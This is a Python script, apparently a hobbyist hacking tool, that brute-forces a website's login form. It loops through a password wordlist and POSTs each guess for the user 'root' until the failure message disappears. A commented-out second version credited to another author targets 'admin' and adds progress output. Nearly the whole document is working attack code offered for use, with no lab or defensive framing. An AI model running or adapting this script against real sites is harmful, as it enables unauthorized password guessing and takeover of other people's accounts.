#!/usr/bin/env python

import requests

target_url = "yourwebsite.com"
data_dictionary = {
    "username": "root",
    "password": "",
    "Login": "submit"}

counter = 0
with open("/directory*/path*/folder*/passwords.txt", "r") as passwords_file:
    for p_line in passwords_file:
        passwd = p_line.strip()
        data_dictionary["password"] = passwd
        response = requests.post(target_url, data=data_dictionary)
        if "login failed" not in response.content.decode():
            print("[+] Password found --> " + passwd)
            break
        counter += 1

print("[+] Password fetched on {counter} iterations! ")


# improved implementation of the above code. courtesy of Saher Mohammed
#
# data_dict = {
#     "username": "admin",
#     "password": "",
#     "Login": "submit"
# }
#
#
# def check_website(url):
#     try:
#         get_response = requests.get(url=url)
#         if get_response.status_code == 200:
#             print(f"[+] HTTP {get_response.status_code} OK, Website Exist. :-)")
#     except requests.exceptions.InvalidURL:
#         print("[-] Invalid URL, Please Check it Again.")
#
#
# print("")
# counter = 1
#
# with open(file="passwords.txt", mode="r") as wordlist_file:
#     check_website(url=target_url)
#     for line in wordlist_file:
#         data_dict["password"] = line.strip()
#         post_response = requests.post(url=target_url, data=data_dict)
#         print(f"[*] Trying {line.strip()} ..", end="\r")
#         if "Login failed" not in post_response.content.decode("utf-8"):
#             print(f"[+] Got the Password ==> {line}")
#             break
#         counter += 1
#
#     print(f"[+] Fetched {counter} Passwords.")